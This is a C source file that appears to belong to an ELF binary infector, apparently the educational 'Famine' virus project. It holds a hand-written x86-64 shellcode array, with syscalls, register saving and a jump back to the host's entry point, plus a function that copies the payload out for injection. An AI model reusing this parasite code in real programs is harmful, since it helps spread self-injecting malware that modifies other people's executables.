#include "../include/famine.h"

unsigned char code[] = {  0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
                          0x48, 0x81, 0xec, 0x00, 0x10, 0x00, 0x00,
                          0x48, 0x89, 0xc7,
                          0xb8, 0x78, 0x00, 0x00, 0x00,
                          0x48, 0x89, 0xe6,
                          0xba, 0x00, 0x10, 0x00, 0x00,
                          0x0f, 0x05,
                          0xeb, 0x37,
                          
                          0x54,
                          0x50,
                          0x57,
                          0x56,
                          0x52,
                          0x51,
                          0x55,
                          0xb8, 0x01, 0x00, 0x00, 0x00,
                          0xbf, 0x01, 0x00, 0x00, 0x00,
                          0x48, 0x8d, 0x35, 0xde, 0xff, 0xff, 0xff,
                          0xba, 0x05, 0x00, 0x00, 0x00,
                          0x0f, 0x05,
                          0xb8, 0x02, 0x00, 0x00, 0x00,
                          0x48, 0x8d, 0x3d, 0xcb, 0xff, 0xff, 0xff,
                          0xbe, 0x02, 0x00, 0x00, 0x00,
                          0x0f, 0x05,
                          0x48, 0x85, 0xc0,
                          0x74, 0xae,
                          
                          0x5d,
                          0x59,
                          0x5a,
                          0x5e,
                          0x5f,
                          0x58,
                          0x5c,
                          0xe9, 0x10, 0x50, 0x00, 0x00
                        };

unsigned char *get_code(size_t *size) {
    unsigned char *code_local;

    *size = 104;
    code_local = malloc(*size + 13);
    if (!code_local)
        return (NULL);
    memcpy(code_local, code, *size);
    return (code_local);
}